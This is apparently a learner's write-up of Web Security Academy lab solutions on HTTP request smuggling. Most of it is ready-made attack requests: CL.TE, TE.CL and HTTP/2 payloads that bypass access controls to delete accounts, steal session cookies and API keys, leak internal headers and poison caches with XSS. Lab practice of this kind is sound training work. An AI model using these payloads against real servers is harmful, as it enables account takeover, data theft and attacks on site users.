# Request Smuggling
1. This lab has a CL.TE vulnerability, so the front end uses content-length while the back end uses transfer encoding. As a result, sending a POST request with the following headers/body can modify the next request via smuggling:
```
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
2. This lab has a TE.CL vulnerability, which is the opposite of the previous lab. The following POST request can smuggle headers onto the next request (the 2 trailing newlines are required):
```
POST / HTTP/1.1
Host: acce1fb41fedeb49c0f6233c0074002d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
3. This lab has a TE.TE vulnerability, where one of the servers will ignore a malformed `Transfer-Encoding` header and the other will not. As a result, the following payload can smuggle headers onto the next request:
```
POST / HTTP/1.1
Host: ac8b1f1b1e21f6d0c0c894d5002800e2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

# Finding request smuggling vulnerabilities
1. This lab has a CL.TE vulnerability, and can be used to cause the next request to result in a 404 response, regardless of the request. The following payload performs this attack:
```
POST / HTTP/1.1
Host: ac191fed1f58e63bc05b5c5500e900a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```
2. This lab is the same as the previous, but with TE.CL instead. The following payload solves causes the incorrect 404 response:
```
POST / HTTP/1.1
Host: ac861f6b1f529bd0c08062e8009800b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

# Exploiting
1. This lab is about utilizing a CL.TE vulnerability to bypass authentication control on the front-end server. By smuggling a request, we can cause the next request that the server receives to be a request that causes the `carlos` account to be deleted by bypassing the front-end check and adding the `Host: localhost` header. The following payload executes the attack:
```
POST / HTTP/1.1
Host: accd1f121fd01b67c0396e06007b00dc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
2. This lab is the same as the previous, but with TE.CL instead. The following is the previous payload switched for this new ordering:
```
POST / HTTP/1.1
Host: ac881f821e42f646c087a01900530000.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
3. This lab is about using request smuggling to leak and then override headers that are added by the front-end server. To leak the headers of a request rewritten by the front-end server, the following payload can be used:
```
POST / HTTP/1.1
Host: ace61f001eb9babcc02ab252007f00dc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=
```
This will use the search feature to leak the beginning of the request headers, which contains a custom IP header for determining if a request is allowed to access the admin page. Using that information, the following payload can be used to trick the backend into thinking the next request is one to delete the `carlos` account coming from localhost:
```
POST / HTTP/1.1
Host: ace61f001eb9babcc02ab252007f00dc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-FFjOLo-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```
4. This lab uses request smuggling to put a victim's request into a comment via a smuggled comment POST request. While I was having a difficult time getting the victim user to look at the page at the right time due to the randomized timings, this payload does appear to work and posts my own requests into a comment when I immediately trigger the attack. From there, taking over the user's account simply involves manually changing your session cookie to match the leaked one. The following payload triggers the attack:
```
POST / HTTP/1.1
Host: ac021f1b1f31eb76c0ef2ea900d90055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 249
Transfer-Encoding: chunked

0


POST /post/comment HTTP/1.1
Cookie: session=eG29Rg0SwO9RBhHq3WsYoxEoS8STFsLD
Content-Type: application/x-www-form-urlencoded
Content-Length: 700

csrf=XEQZpVVkUYbZIQKleJudPB4iTmE1NAY8&postId=6&name=fda&email=sa%40asd.as&website=&comment=
```
5. This lab combines a CL.TE vulnerability with a cache poisoning attack in order to make the effects of a request smuggling attack more permanent than only affecting the next request. To exploit this, first the exploit server must be set to return the contents `alert(document.cookie)` at the endpoint `/post` as this is the open redirect that we can create via a smuggled `Host` header. At this point, we can smuggle a request with the following payload:
```
POST / HTTP/1.1
Host: ac9b1f691e5d87a6c05b5f8e00d00045.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-ac7a1f961e118799c0955f1801af00f6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
This payload will cause the next request to redirect to our exploit server's `/post` endpoint. To poison the cache, we can simply navigate to `/resources/js/tracking.js`, where the smuggled response will be cached, causing XSS on a normal page load due to the arbitrary redirection of `tracking.js`
6. This lab is the opposite of the above, where we will utilize a request smuggling vulnerability to make the victim place sensitive data into a location that gets cached so we can access it. To do this, we first must perform a CL.TE attack using the following payload to smuggle a request to the `/my-account` endpoint:
```
POST / HTTP/1.1
Host: aca81f5a1e8b1958c0b9065600ee0042.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```
At this point, we wait for the victim to make some request before we make a request to the home page in an incognito window (in order to prevent our session from being used, creating a false positive). We can scan all of the static resources to find the string `API Key` in order to find which request was poisoned and extract the victim's leaked API key

# Advanced
1. This lab solution wasn't working within the browser for some reason, although it did appear to work within Burp Repeater. After consulting the example solution, I still couldn't get it working and I'm not sure why. The following is my final payload:
```
POST / HTTP/2
Host: ac101ff41e6f7234c094d92e0075005b.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-ac231f511e88720dc0a3d9c601d200f6
Content-Length: 5

x=1
```
2. This lab is about smuggling an entire valid request in order to desynchronize the responses. This will result in each request being served the previous request's response. While the goal of the lab is to get served the response from the admin user logging in, I had a difficult time getting the timing to work and as such never managed to steal their cookie. However, the following payload did work and was successfully serving me other user's responses:
```
POST /x HTTP/2
Host: ac3c1fdb1f304080c04d167b00b200cd.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: ac3c1fdb1f304080c04d167b00b200cd.web-security-academy.net


```
3. This lab is about using headers smuggled within an HTTP/2 request to cause request smuggling. By using HTTP/2, we can include a `/r/n` sequence within a header's value field in order to hide and inject an arbitrary header into the HTTP/1.1 equivalent that gets generated from downgrading. As a result, the following payload can be used to make the next request sent by a user of the website to end up being searched on our account, allowing us to retrieve the request contents (including the session cookie) from our search history:
```
0

POST / HTTP/1.1
Host: ac791fc01f368077c0a869e2002400bf.web-security-academy.net
Cookie: session=tLgGKbh78ULe0FBVWjFa5oKkM7xo5IhY
Content-Length: 800

search=x
```
The previous is the request body, and it has a modified header of the form:
```
foo: bar
Transfer-Encoding: chunked
```
where the newline is a full `\r\n` sequence
4. This lab is about once again using response queue poisoning in order to steal the admin user's session cookie when the sign in. This can be leveraged to take over their account and access the admin panel by replacing your own session cookie with the stolen one. Adding the following header to a HTTP/2 request causes the queue poisoning to happen by injecting an entire extra HTTP/1.1 request within a header (note that all newlines are full `\r\n` sequences instead of just `\n`):
```
foo: bar

GET /x HTTP/1.1
Host: ac241fe31fce67a3c09d70c800be00e7.web-security-academy.net
```

# Request tunneling
1. This lab is about using a tunneled request to leak internal headers, and then use those internal headers to create a tunneled request that delets a user's account. To leak the headers, a POST request can be sent to the home page with the following header added and a search term that's over 500 characters long:
```
foo: bar\r\n
Content-Length: 500\r\n
\r\n
search=x
```
The previous is the name of the header, the value can be arbitrary. Once the leaked headers and values are found, the following header can be sent in a `HEAD` request to `/login` in order to delete the `carlos` account:
```
foo: bar

GET /admin/delete?username=carlos HTTP/1.1
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 9781526443806180


```
Once again, the previous is just the name of the header and the value is arbitrary
2. This lab is about poisoning the cache with an XSS response that isn't normally accessible via request tunneling. This is done through smuggling a request in the `:path` HTTP/2 pseudo-header value, taking advantage of the fact that sending a request to the `/resources` endpoint results in a redirect to `/resources/`. As such, by tunneling a request to `/resources?<script>alert()</script>`, we can get an embedded response containing the string `/resources/?<script>alert()</script>`, which will be interpreted as HTML by the encapsulating (and cacheable) response. In order to prevent issues with timing out, the path request must be at least 8308 bytes long (when using the home page as a target), so I padded the payload with the character `a` until is was long enough. Sending a HTTP/2 HEAD request to `/` with the following value for the `:path` pseudo-header results in the cache poisoning XSS:
```
/ HTTP/1.1
Host: ac711fa51e8d06ffc0e9a05400980086.web-security-academy.net

GET /resources?<script>alert()</script>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...] HTTP/1.1
Foo: bar
```
Note that all newlines in the payload are full `\r\n` sequences
